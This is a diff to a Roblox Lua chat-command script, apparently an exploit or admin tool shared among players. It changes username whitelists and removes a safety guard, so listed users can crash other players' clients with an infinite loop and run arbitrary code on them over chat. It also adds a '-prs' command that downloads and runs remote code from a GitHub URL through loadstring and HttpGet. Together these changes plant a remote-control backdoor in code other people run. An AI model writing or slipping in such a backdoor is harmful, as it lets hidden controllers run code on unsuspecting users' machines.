@@ -307,8 +307,8 @@ local specialperms = {
     "me_123eq",
     "me_crashking",
     "ScriptingProgrammer",
- --[[   "atprog",
-    "IceStuds", ]]
+    "atprog",
+    "IceStuds",
     "s_pisafurry",
    -- "dawninja21",
   --  "dawninja21alt",
@@ -326,8 +326,7 @@ local atprogperms = {
     "grimAuxiliatrix",
     "undertaker629",
     "jjjuuikjjikkju",
-    "BANNter_Original",
-    "Palamode"
+    "FR6DDIIE"
 }
 
 -- Users that can use blacklisted gears (or gears when antigear is on)
@@ -8469,9 +8468,7 @@ v.Chatted:Connect(function(msg)
                 end
 
         	if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                                if thesecretvariable == true then 
-					Speak("atprog groomed me") 
-				end
+					Speak("Collect my pages pav...")
                 end
 
                 if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
@@ -8518,10 +8515,8 @@ v.Chatted:Connect(function(msg)
                 end
 
                 if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                                if thesecretvariable == true then 
 				       while true do end
                                 -- game:Shutdown()
-				end
                 end
 
            	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
@@ -8531,10 +8526,12 @@ v.Chatted:Connect(function(msg)
     		end
 
            	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-        			if thesecretvariable == true then
 				        Execute(string.sub(msg, 6))
-			        end
     		end
+
+               if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
+            end
 
            	if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
 				if thesecretvariable == true then
